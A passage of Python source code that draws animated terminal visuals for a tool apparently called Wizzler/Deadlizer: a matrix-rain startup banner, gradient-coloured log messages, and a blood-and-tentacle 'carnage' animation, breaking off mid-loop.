  "                  iXXXx X!  XX! !Xx.  ,.     xs.,XXi !XXXXXXf",
  "                   XXXXXXXXXXXXXXXXX! _!XXx  dXXXXXXX.iXXXXXX",
  "                   VXXXXXXXXXXXXXXXXXXXXXXXxxXXXXXXXXXXXXXXX!",
  "                   YXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXV",
  "                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf",
  "                       VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf",
  "                         VXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`",
  "                          ~vXXXXXXXXXXXXXXXXXXXXXXXf`",
  "                              ~vXXXXXXXXXXXXXXXXv~",
  "                                 '~VvXXXXXXXV~~",
  "                                       ~~",
]


def show_startup_banner():
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    sys.stdout.write("\033[?25l") # Hide cursor
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols = os.get_terminal_size().columns
        rows = os.get_terminal_size().lines
    except Exception:
        cols = 120
        rows = 30

    # Ensure max_width doesn't exceed terminal cols
    banner_block_raw = STARTUP_BANNER
    
    max_w_raw = max(len(line) for line in banner_block_raw)
    banner_block = banner_block_raw

    total_lines = len(banner_block)
    max_width = max(len(line) for line in banner_block) # Recalculate max_width
    glitch_chars = "||||+||++++--|-+|||_"
    rain_chars = "???????????????????????????????????0123456789"
    sparkle_chars = "+*.:o^"

    def hsv_to_rgb(h, s, v):
        h = h % 360
        c = v * s
        x = c * (1 - abs((h / 60) % 2 - 1))
        m = v - c
        if h < 60: r, g, b = c, x, 0
        elif h < 120: r, g, b = x, c, 0
        elif h < 180: r, g, b = 0, c, x
        elif h < 240: r, g, b = 0, x, c
        elif h < 300: r, g, b = x, 0, c
        else: r, g, b = c, 0, x
        return int((r + m) * 255), int((g + m) * 255), int((b + m) * 255)

    rain_rows = min(rows - 2, total_lines + 4)
    num_columns = min(cols, max_width + 20)
    col_offset = max((cols - num_columns) // 2, 0)

    drops = []
    for c in range(num_columns):
        drops.append({
            'y': random.randint(-rain_rows, 0),
            'speed': random.uniform(0.4, 1.2),
            'trail': random.randint(4, 12),
            'char_seed': random.randint(0, 100),
        })

    rain_frames = 15
    for frame in range(rain_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[H")  
        fade_out = max(0.0, 1.0 - frame / (rain_frames - 1)) if frame > rain_frames * 0.6 else 1.0

        for row in range(rain_rows):
            line_out = " " * col_offset
            for c in range(num_columns):
                d = drops[c]
                dist = row - d['y']
                if 0 <= dist <= d['trail']:
                    intensity = 1.0 - (dist / d['trail'])
                    intensity *= fade_out
                    if dist == 0:
                        r, g, b = int(200 * intensity), int(255 * intensity), int(220 * intensity)
                    else:
                        trail_t = dist / d['trail']
                        r = int((180 - 180 * trail_t) * intensity)
                        g = int((50 + 200 * trail_t) * intensity)
                        b = int((255 - 100 * trail_t) * intensity)
                    ch = random.choice(rain_chars)
                    line_out += f"\033[38;2;{r};{g};{b}m{ch}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")

        # Advance drops
        for d in drops:
            d['y'] += d['speed']
            if d['y'] - d['trail'] > rain_rows:
                d['y'] = random.randint(-8, -1)
                d['speed'] = random.uniform(0.4, 1.2)
                d['trail'] = random.randint(4, 12)

        sys.stdout.flush()
        time.sleep(0.02)

    os.system("cls") if os.name == "nt" else os.system("clear")

    phase1_frames = 30
    lock_frame = []
    for row_idx, line in enumerate(banner_block):
        row_locks = []
        for col_idx in range(len(line)):
            cx, cy = max_width / 2, total_lines / 2
            dist = math.sqrt((col_idx - cx) ** 2 + ((row_idx - cy) * 3) ** 2)
            max_dist = math.sqrt(cx ** 2 + (cy * 3) ** 2)
            progress = dist / max(max_dist, 1)
            lock_at = int(5 + progress * (phase1_frames - 12)) + random.randint(-3, 3)
            lock_at = max(3, min(phase1_frames - 3, lock_at))
            row_locks.append(lock_at)
        lock_frame.append(row_locks)

    for frame in range(phase1_frames):
        if skipper.should_skip:
            break
        if frame > 0:
            sys.stdout.write(f"\033[{total_lines}A")

        t = frame / max(phase1_frames - 1, 1)
        wave_x = t * (max_width + 50) - 25
        ring_radius = t * max(max_width, total_lines * 3) * 0.9

        for row_idx, line in enumerate(banner_block):
            pad = max((cols - max_width) // 2, 0)
            output = ""
            for col_idx, real_char in enumerate(line):
                locked = frame >= lock_frame[row_idx][col_idx]

                if real_char == ' ':
                    if frame < phase1_frames // 4 and random.random() < 0.04:
                        ch = random.choice(glitch_chars)
                    else:
                        ch = ' '
                elif not locked:
                    reveal_chance = (frame / lock_frame[row_idx][col_idx]) ** 2
                    if random.random() < reveal_chance * 0.5:
                        ch = real_char
                    else:
                        ch = random.choice(glitch_chars)
                else:
                    ch = real_char

                hue = (col_idx * 2.5 + row_idx * 8 + frame * 12) % 360
                hue = 240 + ((hue / 360) * 150) % 150
                sat = 0.85
                val = min(1.0, t * 1.8)

                # Ring glow
                cx, cy = max_width / 2, total_lines / 2
                dist_ring = abs(math.sqrt((col_idx - cx) ** 2 + ((row_idx - cy) * 3) ** 2) - ring_radius)
                ring_glow = max(0.0, 1.0 - dist_ring / 15.0)

                dist_wave = abs(col_idx - wave_x)
                wave_glow = max(0.0, 1.0 - dist_wave / 20.0)

                combined_glow = min(1.0, ring_glow * 0.6 + wave_glow * 0.5)

                r, g, b = hsv_to_rgb(hue, sat, val)

                if combined_glow > 0:
                    r = min(255, int(r + (255 - r) * combined_glow * 0.8))
                    g = min(255, int(g + (255 - g) * combined_glow * 0.95))
                    b = min(255, int(b + (255 - b) * combined_glow * 0.9))

                if locked and real_char != ' ' and random.random() < 0.008:
                    r, g, b = 255, 255, 255

                output += f"\033[38;2;{r};{g};{b}m{ch}"

            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.025)

    shimmer_frames = 15
    for frame in range(shimmer_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(shimmer_frames - 1, 1)

        for row_idx, line in enumerate(banner_block):
            pad = max((cols - max_width) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                # Flowing rainbow hue
                hue = (col_idx * 3 + row_idx * 12 - frame * 15) % 360
                # Blend from rainbow ? final Wizzler/Deadlizer colors
                settle = t * t  # ease-in to settle

                r_rainbow, g_rainbow, b_rainbow = hsv_to_rgb(hue, 0.9, 1.0)

                v_blend = row_idx / max(total_lines - 1, 1)
                h_blend = col_idx / max(len(line) - 1, 1)
                r_final = int(WIZZLER_START[0] * (1 - h_blend) + WIZZLER_END[0] * h_blend)
                g_final = int(WIZZLER_START[1] * (1 - h_blend) + WIZZLER_END[1] * h_blend)
                b_final = int(WIZZLER_START[2] * (1 - h_blend) + WIZZLER_END[2] * h_blend)
                # Vertical blend toward Deadlizer
                r_final = int(r_final * (1 - v_blend * 0.3) + DEADLIZER_START[0] * v_blend * 0.3)
                g_final = int(g_final * (1 - v_blend * 0.3) + DEADLIZER_START[1] * v_blend * 0.3)
                b_final = int(b_final * (1 - v_blend * 0.3) + DEADLIZER_START[2] * v_blend * 0.3)

                r = int(r_rainbow * (1 - settle) + r_final * settle)
                g = int(g_rainbow * (1 - settle) + g_final * settle)
                b = int(b_rainbow * (1 - settle) + b_final * settle)

                # Traveling sparkle particles
                sparkle_wave = math.sin((col_idx * 0.15 - frame * 0.8 + row_idx * 0.5)) * 0.5 + 0.5
                if sparkle_wave > 0.92 and ch != ' ' and random.random() < 0.4:
                    spark_ch = random.choice(sparkle_chars)
                    r, g, b = min(255, r + 120), min(255, g + 120), min(255, b + 120)
                    output += f"\033[38;2;{r};{g};{b}m{spark_ch}"
                else:
                    output += f"\033[38;2;{r};{g};{b}m{ch}"

            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    for pulse in range(5):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        # Smooth sine pulse
        pulse_val = (math.sin(pulse * math.pi * 0.8) + 1) / 2
        brightness = 0.5 + pulse_val * 0.5

        for row_idx, line in enumerate(banner_block):
            pad = max((cols - max_width) // 2, 0)
            v_blend = row_idx / max(total_lines - 1, 1)
            r = min(255, int((WIZZLER_START[0] * (1 - v_blend) + DEADLIZER_START[0] * v_blend) * brightness + 100 * pulse_val))
            g = min(255, int((WIZZLER_START[1] * (1 - v_blend) + DEADLIZER_START[1] * v_blend) * brightness + 50 * pulse_val))
            b = min(255, int((WIZZLER_START[2] * (1 - v_blend) + DEADLIZER_START[2] * v_blend) * brightness + 80 * pulse_val))
            colored = f"\033[1m\033[38;2;{r};{g};{b}m" + line + "\033[0m"
            sys.stdout.write(" " * pad + colored + "\n")
        sys.stdout.flush()
        time.sleep(0.04)
        
    breathe_frames = 10
    for frame in range(breathe_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(breathe_frames - 1, 1)
        # Gentle breathing: slight glow oscillation that fades to steady
        breathe = math.sin(t * math.pi * 3) * (1 - t) * 0.2

        for row_idx, line in enumerate(banner_block):
            pad = max((cols - max_width) // 2, 0)
            output = ""
            v_blend = row_idx / max(total_lines - 1, 1)
            for col_idx, ch in enumerate(line):
                h_blend = col_idx / max(len(line) - 1, 1)
                r = int(WIZZLER_START[0] * (1 - h_blend) + WIZZLER_END[0] * h_blend)
                g = int(WIZZLER_START[1] * (1 - h_blend) + WIZZLER_END[1] * h_blend)
                b = int(WIZZLER_START[2] * (1 - h_blend) + WIZZLER_END[2] * h_blend)
                # Vertical blend
                r = int(r * (1 - v_blend * 0.3) + DEADLIZER_START[0] * v_blend * 0.3)
                g = int(g * (1 - v_blend * 0.3) + DEADLIZER_START[1] * v_blend * 0.3)
                b = int(b * (1 - v_blend * 0.3) + DEADLIZER_START[2] * v_blend * 0.3)
                # Apply breathing glow
                glow = 1.0 + breathe
                r = min(255, int(r * glow))
                g = min(255, int(g * glow))
                b = min(255, int(b * glow))
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.03)

    if not skipper.should_skip:
        time.sleep(0.3)
    skipper.stop()
    sys.stdout.write("\033[?25h") # Show cursor
    os.system("cls") if os.name == "nt" else os.system("clear")


def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    visible_length = 0
    i = 0
    while i < len(text):
        if text[i] == '\033':
            end = text.find('m', i)
            i = end + 1 if end != -1 else i + 1
        else:
            visible_length += 1
            i += 1
    
    if visible_length == 0:
        return text

    result = ""
    current_idx = 0
    i = 0
    while i < len(text):
        if text[i] == '\033':
            end = text.find('m', i)
            if end != -1:
                result += text[i:end+1]
                i = end + 1
            else:
                result += text[i]
                i += 1
        else:
            ratio = current_idx / max(visible_length - 1, 1)
            r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
            color_code = rgb_to_256(r, g, b)
            if bold:
                result += f"\033[1m\033[38;5;{color_code}m{text[i]}"
            else:
                result += f"\033[38;5;{color_code}m{text[i]}"
            current_idx += 1
            i += 1
    result += "\033[0m"
    return result


def get_mode_colors():
    if __mode__ == "deadlizer":
        return DEADLIZER_START, DEADLIZER_END
    else:
        return WIZZLER_START, WIZZLER_END


def format_log_message(status, message, padding=50):
    grey = "\033[90m"
    reset = "\033[0m"

    timestamp = f"{grey}[{datetime.now():%Y-%m-%d %H:%M:%S}]{reset}"
    user_tag = f"{grey}~ Wizzed By Codez {reset}"

    mode_start, mode_end = get_mode_colors()

    # Calculate visible length for accurate padding
    visible_len = 0
    _t_idx = 0
    while _t_idx < len(message):
        if message[_t_idx] == '\033':
            _end = message.find('m', _t_idx)
            _t_idx = _end + 1 if _end != -1 else _t_idx + 1
        else:
            visible_len += 1
            _t_idx += 1
    
    padded_msg = message + " " * max(0, padding - visible_len)

    if status == "SUCCESS":
        status_text = gradient_text(
            "(+) SUCCESS", GREEN_START, GREEN_END, bold=True)
        msg_text = gradient_text(
            padded_msg,
            GREEN_START,
            GREEN_END,
            bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"

    elif status == "ERROR":
        status_text = gradient_text("(-) ERROR", RED_START, RED_END, bold=True)
        msg_text = gradient_text(
            padded_msg,
            RED_START,
            RED_END,
            bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"

    elif status == "INPUT":
        grey = "\033[90m"
        reset = "\033[0m"
        bracket_open = gradient_text(
            "(", WIZZLER_START, WIZZLER_END, bold=True)
        bracket_close = gradient_text(
            ")", WIZZLER_START, WIZZLER_END, bold=True)
        status_text = bracket_open + grey + "INP" + reset + bracket_close + \
            " " + gradient_text("INPUT", mode_start, mode_end, bold=True)
        msg_text = gradient_text(
            padded_msg,
            mode_start,
            mode_end,
            bold=True)
        arrow = gradient_text(">", mode_start, mode_end, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}  {arrow}  "

    else:
        status_text = gradient_text(
            "(~) INFO", mode_start, mode_end, bold=True)
        msg_text = gradient_text(
            padded_msg,
            mode_start,
            mode_end,
            bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"


def _carnage_effect():
    """SYMBIOTE APOCALYPSE 4K: Ultra-cinematic dark horror — maximum density, maximum carnage."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 35

    # ── Color palette ─────────────────────────────────────────────────────────
    def blood_color(i, flicker=0.0):
        i = max(0.0, min(1.0, i))
        f = 1.0 + flicker * random.uniform(-0.25, 0.25)
        return (min(255, int((220 * i + 35) * f)), min(255, int(6 * i * f)), min(255, int(14 * i * f)))

    def symbiote_color(t, phase=0.0):
        # Deep crimson → electric magenta → toxic orange tips
        r = min(255, int(230 * t + 60 * abs(math.sin(t * math.pi + phase))))
        g = min(255, int(5 * t + 12 * abs(math.sin(phase * 1.7))))
        b = min(255, int(70 * abs(math.sin(t * math.pi * 2.2 + phase))))
        return r, g, b

    def dark_purple(t, phase=0.0):
        r = min(255, int(90 * t + 25 * abs(math.sin(phase))))
        g = 0
        b = min(255, int(140 * t + 55 * abs(math.sin(phase + 1.0))))
        return r, g, b

    def toxic_vein(t, phase=0.0):
        # Sickly green-yellow veins for variety
        r = min(255, int(40 * t))
        g = min(255, int(180 * t + 30 * abs(math.sin(phase))))
        b = min(255, int(10 * t))
        return r, g, b

    def white_hot(pulse):
        v = min(255, int(255 * pulse))
        return v, min(255, int(v * 0.85)), min(255, int(v * 0.7))

    def radial_pulse_color(dist, radius, frame):
        ring_width = 6.0
        d = abs(dist - radius)
        if d > ring_width: return None
        intensity = (1.0 - d / ring_width) ** 2
        r = min(255, int(255 * intensity))
        g = min(255, int(20 * intensity))
        b = min(255, int(30 * intensity))
        return r, g, b

    TENTACLE_CHARS = "╠╣╦╩╬╔╗╚╝║═▓█▒░@#&%$~≈≋"
    VEIN_CHARS     = "│┤╡╢╖╕╣║╗╝╜╛┐└┴┬├─┼╞╟╚╔╩╦╠═╬╧╨╤╥╙╘╒╓╫╪┘┌"
    GORE_CHARS     = "▓█▒░╬╠╣╦╩@#&%$~*+×÷"
    GLITCH_CHARS   = "!@#$%^&*<>?|\\/{}"
    DRIP_CHARS     = "▓█▒░│┃╽╿"
    CRACK_CHARS    = "/\\|_-~^"
    SPARK_CHARS    = "·∙•◦○◉★✦✧"

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 0 — FAST TAKEOVER  (28 frames @ 8ms)
    # 400 red particles + 28 tentacles explode from all edges with radial pulses
    # ══════════════════════════════════════════════════════════════════════════
    w_banner = [line.center(cols) for line in WIZZLER_ASCII]
    banner_top = rows // 2 - len(w_banner) // 2

    # Dense invasion swarm — 4K density
    inv_particles = []
    for _ in range(400):
        side = random.randint(0, 3)
        if side == 0:   px2, py2 = random.randint(0, cols-1), 0
        elif side == 1: px2, py2 = random.randint(0, cols-1), rows-1
        elif side == 2: px2, py2 = 0, random.randint(0, rows-1)
        else:           px2, py2 = cols-1, random.randint(0, rows-1)
        angle_p = math.atan2(rows//2 - py2, cols//2 - px2) + random.uniform(-0.6, 0.6)
        speed = random.uniform(2.0, 6.5)
        inv_particles.append({
            'x': float(px2), 'y': float(py2),
            'vx': math.cos(angle_p) * speed,
            'vy': math.sin(angle_p) * speed * 0.55,
            'char': random.choice("█▓▒░@#&*+◉•"),
            'life': random.uniform(0.7, 1.0),
            'color_phase': random.uniform(0, math.pi * 2),
        })

    # Invasion tentacles — fast, thick
    inv_tentacles = []
    for i in range(28):
        side = i % 4
        if side == 0:   tx, ty = random.randint(0, cols-1), 0
        elif side == 1: tx, ty = random.randint(0, cols-1), rows-1
        elif side == 2: tx, ty = 0, random.randint(0, rows-1)
        else:           tx, ty = cols-1, random.randint(0, rows-1)
        angle = math.atan2(rows//2 - ty, cols//2 - tx) + random.uniform(-0.5, 0.5)
        inv_tentacles.append({
            'x': float(tx), 'y': float(ty),
            'angle': angle,
            'speed': random.uniform(3.5, 7.0),
            'wave_amp': random.uniform(1.0, 2.5),
            'wave_freq': random.uniform(0.2, 0.6),
            'wave_phase': random.uniform(0, math.pi * 2),
            'history': [(tx, ty)],
            'max_hist': random.randint(14, 32),
            'thickness': random.randint(2, 5),
            'char': random.choice(TENTACLE_CHARS),
            'age': 0,
            'color_phase': random.uniform(0, math.pi * 2),
        })

    # Radial pulse rings — expand from center
    pulse_rings = [{'radius': 0.0, 'speed': random.uniform(3.5, 6.0)} for _ in range(3)]

    for frame in range(28):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 27
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]

        # Radial pulse rings
        cx_r, cy_r = cols // 2, rows // 2
        for ring in pulse_rings:
            ring['radius'] += ring['speed']
            for r_idx in range(rows):
                for c_idx in range(cols):
                    dist = math.sqrt((c_idx - cx_r) ** 2 + ((r_idx - cy_r) * 2.2) ** 2)
                    col = radial_pulse_color(dist, ring['radius'], frame)
                    if col:
                        grid[r_idx][c_idx] = random.choice("░▒▓")
                        cgrid[r_idx][c_idx] = col

        # Draw Wizzler banner dying fast
        for r_idx in range(rows):
            line_idx = r_idx - banner_top
            if 0 <= line_idx < len(w_banner):
                for c_idx, char in enumerate(w_banner[line_idx]):
                    if char != " ":
                        survive = max(0.0, 1.0 - t * 2.0)
                        if random.random() < survive:
                            r2 = int(WIZZLER_START[0] * survive)
                            g2 = int(WIZZLER_START[1] * survive)
                            b2 = int(WIZZLER_START[2] * survive)
                            grid[r_idx][c_idx] = char
                            cgrid[r_idx][c_idx] = (r2, g2, b2)
                        elif random.random() < 0.7:
                            grid[r_idx][c_idx] = random.choice(GLITCH_CHARS)
                            cgrid[r_idx][c_idx] = blood_color(random.uniform(0.5, 1.0), flicker=0.4)

        # Invasion particles with splatter
        for p in inv_particles:
            p['x'] += p['vx']
            p['y'] += p['vy']
            p['life'] -= 0.035
            if p['life'] <= 0: continue
            gx, gy = int(p['x']), int(p['y'])
            if 0 <= gx < cols and 0 <= gy < rows:
                r2, g2, b2 = blood_color(p['life'], flicker=0.3)
                grid[gy][gx] = p['char']
                cgrid[gy][gx] = (r2, g2, b2)
                # Dense splatter trail
                for _ in range(3):
                    sx = gx + random.randint(-3, 3)
                    sy = gy + random.randint(-1, 1)
                    if 0 <= sx < cols and 0 <= sy < rows:
                        r2, g2, b2 = blood_color(p['life'] * 0.55, flicker=0.2)
                        grid[sy][sx] = random.choice("▒░·,.")
                        cgrid[sy][sx] = (r2, g2, b2)

        # Invasion tentacles
        for tent in inv_tentacles:
            tent['age'] += 1
            perp = tent['angle'] + math.pi / 2
            wave_off = tent['wave_amp'] * math.sin(tent['age'] * tent['wave_freq'] + tent['wave_phase'])
            dx = cols // 2 - tent['x']
            dy = rows // 2 - tent['y']
            steer = math.atan2(dy, dx)
            diff = steer - tent['angle']
            while diff > math.pi:  diff -= 2*math.pi
            while diff < -math.pi: diff += 2*math.pi
            tent['angle'] += diff * 0.14 + random.uniform(-0.12, 0.12)
            tent['x'] = (tent['x'] + math.cos(tent['angle']) * tent['speed'] + math.cos(perp) * wave_off) % cols
            tent['y'] = (tent['y'] + math.sin(tent['angle']) * tent['speed'] + math.sin(perp) * wave_off * 0.5) % rows
            px2, py2 = int(tent['x']), int(tent['y'])
            if 0 <= px2 < cols and 0 <= py2 < rows:
                tent['history'].append((px2, py2))
            if len(tent['history']) > tent['max_hist']:
                tent['history'].pop(0)
            for h_idx, (hx, hy) in enumerate(tent['history']):
                if not (0 <= hx < cols and 0 <= hy < rows): continue
                seg_t = h_idx / max(len(tent['history'])-1, 1)
                if h_idx == len(tent['history']) - 1:
                    r2, g2, b2 = white_hot(0.9 + 0.1 * math.sin(frame * 0.5))
                    ch = tent['char']
                else:
                    r2, g2, b2 = blood_color(seg_t * 0.95, flicker=0.12)
                    ch = random.choice(VEIN_CHARS)
                for dx2 in range(-(tent['thickness']//2), tent['thickness']//2 + 1):
                    nx2 = hx + dx2
                    if 0 <= nx2 < cols:
                        grid[hy][nx2] = ch
                        cgrid[hy][nx2] = (r2, g2, b2)

        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r2, g2, b2 = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r2};{g2};{b2}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.008)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 1 — CARNAGE TENTACLE SWARM  (50 living symbiote tendrils)
    # Each tendril: thick pulsing body, white-hot crackling tip, venom drool
    # ══════════════════════════════════════════════════════════════════════════
    tentacles = []
    num_tentacles = 50
    for i in range(num_tentacles):
        side = i % 4
        if side == 0:   tx, ty = random.randint(0, cols-1), 0
        elif side == 1: tx, ty = random.randint(0, cols-1), rows-1
        elif side == 2: tx, ty = 0, random.randint(0, rows-1)
        else:           tx, ty = cols-1, random.randint(0, rows-1)
        angle = math.atan2(rows//2 - ty, cols//2 - tx) + random.uniform(-0.9, 0.9)
        tentacles.append({
            'x': float(tx), 'y': float(ty),
            'angle': angle,
            'speed': random.uniform(1.0, 3.5),
            'wave_amp': random.uniform(1.2, 3.5),   # more violent writhing
            'wave_freq': random.uniform(0.15, 0.7),
            'wave_phase': random.uniform(0, math.pi * 2),
            'history': [(tx, ty)],
            'max_hist': random.randint(30, 75),
            'thickness': random.randint(2, 6),       # thicker
            'char': random.choice(TENTACLE_CHARS),
            'age': 0,
            'color_phase': random.uniform(0, math.pi * 2),
            'spawn_delay': i * 1.0,
            'pulse_offset': random.uniform(0, math.pi * 2),  # per-tendril pulse
            'drool_timer': 0,
        })

    # Drool drops — venom that falls off tentacle tips
    drool_drops = []

    # Denser blood drip columns
    drip_cols = {c: {'y': random.uniform(-8, 0), 'speed': random.uniform(0.3, 1.5), 'len': random.randint(4, 16)}
                 for c in random.sample(range(cols), min(cols, 55))}

    for frame in range(50):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]

        # Background: layered dark vein field
        vein_pulse = 0.5 + 0.5 * math.sin(frame * 0.14)
        for r_idx in range(rows):
            for c_idx in range(cols):
                v1 = math.sin(c_idx * 0.09 + frame * 0.07 + r_idx * 0.04)
                v2 = math.sin(c_idx * 0.05 - frame * 0.05 + r_idx * 0.11 + 1.8)
                v3 = math.sin(c_idx * 0.13 + r_idx * 0.07 - frame * 0.09 + 3.1)
                combined = (v1 + v2 + v3) / 3
                if combined > 0.72:
                    intensity = (combined - 0.72) / 0.28 * vein_pulse
                    r, g, b = dark_purple(intensity * 0.8, phase=c_idx * 0.03 + frame * 0.08)
                    grid[r_idx][c_idx] = random.choice(VEIN_CHARS)
                    cgrid[r_idx][c_idx] = (r, g, b)

        # Blood drips
        for dc, drip in drip_cols.items():
            drip['y'] += drip['speed']
            if drip['y'] - drip['len'] > rows:
                drip['y'] = random.uniform(-10, 0)
                drip['speed'] = random.uniform(0.3, 1.5)
                drip['len'] = random.randint(4, 16)
            for seg in range(drip['len']):
                dy = int(drip['y']) - seg
                if 0 <= dy < rows:
                    seg_t = 1.0 - seg / drip['len']
                    r, g, b = blood_color(seg_t * 0.95, flicker=0.18)
                    grid[dy][dc] = random.choice(DRIP_CHARS) if seg == 0 else "│"
                    cgrid[dy][dc] = (r, g, b)

        # Venom drool drops — fall from tentacle tips
        new_drool = []
        for drop in drool_drops:
            drop['y'] += drop['vy']
            drop['vy'] += 0.12  # gravity
            drop['life'] -= 0.06
            if drop['life'] > 0:
                gx, gy = int(drop['x']), int(drop['y'])
                if 0 <= gx < cols and 0 <= gy < rows:
                    r, g, b = blood_color(drop['life'], flicker=0.3)
                    grid[gy][gx] = random.choice("▒░│·")
                    cgrid[gy][gx] = (r, g, b)
                new_drool.append(drop)
        drool_drops = new_drool

        # Carnage tentacles — living, writhing, crackling
        for tent in tentacles:
            if frame < tent['spawn_delay']: continue
            tent['age'] += 1
            tent['drool_timer'] += 1

            # Violent double-frequency writhing
            perp_angle = tent['angle'] + math.pi / 2
            wave_offset = tent['wave_amp'] * math.sin(tent['age'] * tent['wave_freq'] + tent['wave_phase'])
            wave2 = (tent['wave_amp'] * 0.55) * math.sin(tent['age'] * tent['wave_freq'] * 2.8 + tent['wave_phase'] + 1.4)
            wave3 = (tent['wave_amp'] * 0.25) * math.sin(tent['age'] * tent['wave_freq'] * 5.1 + tent['wave_phase'] + 2.7)

            dx = cols // 2 - tent['x']
            dy = rows // 2 - tent['y']
            steer_angle = math.atan2(dy, dx)
            angle_diff = steer_angle - tent['angle']
            while angle_diff > math.pi:  angle_diff -= 2*math.pi
            while angle_diff < -math.pi: angle_diff += 2*math.pi
            tent['angle'] += angle_diff * 0.07 + random.uniform(-0.22, 0.22)
            tent['x'] = (tent['x'] + math.cos(tent['angle']) * tent['speed'] + math.cos(perp_angle) * (wave_offset + wave2 + wave3)) % cols
            tent['y'] = (tent['y'] + math.sin(tent['angle']) * tent['speed'] + math.sin(perp_angle) * (wave_offset + wave2 + wave3) * 0.5) % rows
            px, py = int(tent['x']), int(tent['y'])
            if 0 <= px < cols and 0 <= py < rows:
                tent['history'].append((px, py))
            if len(tent['history']) > tent['max_hist']:
                tent['history'].pop(0)

            # Spawn venom drool from tip every ~8 frames
            if tent['drool_timer'] >= 8 and len(drool_drops) < 120:
                tent['drool_timer'] = 0
                drool_drops.append({
                    'x': float(px), 'y': float(py),
                    'vy': random.uniform(0.3, 0.9),
                    'life': random.uniform(0.5, 1.0),
                })

            hist_len = len(tent['history'])
            for h_idx, (hx, hy) in enumerate(tent['history']):
                if not (0 <= hx < cols and 0 <= hy < rows): continue
                seg_t = h_idx / max(hist_len - 1, 1)

                # Pulsing body brightness — each tendril has its own heartbeat
                body_pulse = 0.75 + 0.25 * math.sin(frame * 0.5 + tent['pulse_offset'] + seg_t * math.pi)

                if h_idx == hist_len - 1:
                    # TIP: white-hot crackling — alternates between pure white and searing orange
                    crack = math.sin(frame * 1.8 + tent['color_phase']) * 0.5 + 0.5
                    r = 255
                    g = min(255, int(180 * crack + 40))
                    b = min(255, int(60 * crack))
                    ch = random.choice("✦★◉•@#")
                elif seg_t > 0.80:
                    # NEAR TIP: bright orange-red transition
                    r = min(255, int(255 * body_pulse))
                    g = min(255, int(60 * body_pulse * (1 - seg_t) * 5))
                    b = min(255, int(20 * body_pulse))
                    ch = random.choice("▓█╬╠╣")
                elif seg_t > 0.50:
                    # MID BODY: deep crimson symbiote
                    r = min(255, int((200 + 55 * body_pulse) * body_pulse))
                    g = min(255, int(8 * body_pulse))
                    b = min(255, int(15 * body_pulse))
                    ch = random.choice(TENTACLE_CHARS)
                elif seg_t > 0.20:
                    # LOWER BODY: dark blood red
                    r, g, b = blood_color(seg_t * body_pulse, flicker=0.15)
                    ch = random.choice(VEIN_CHARS)
                else:
                    # ROOT: near-black dark purple anchor
                    r, g, b = dark_purple(seg_t * 0.7, phase=tent['color_phase'])
                    ch = random.choice(VEIN_CHARS)

                # Draw with thickness — thicker near root, tapers to tip
                taper = max(1, int(tent['thickness'] * (1.0 - seg_t * 0.6)))
                for dx2 in range(-(taper//2), taper//2 + 1):
                    for dy2 in range(-(taper//4), taper//4 + 1):
                        nx2, ny2 = hx + dx2, hy + dy2
                        if 0 <= nx2 < cols and 0 <= ny2 < rows:
                            grid[ny2][nx2] = ch
                            cgrid[ny2][nx2] = (r, g, b)

        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r, g, b = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r};{g};{b}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.010)

    # ══════════════════════════════════════════════════════════════════════════
    # GLITCH FLASH — cinematic cut between phases
    # ══════════════════════════════════════════════════════════════════════════
    for flash in range(5):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        for r_idx in range(rows):
            line_out = ""
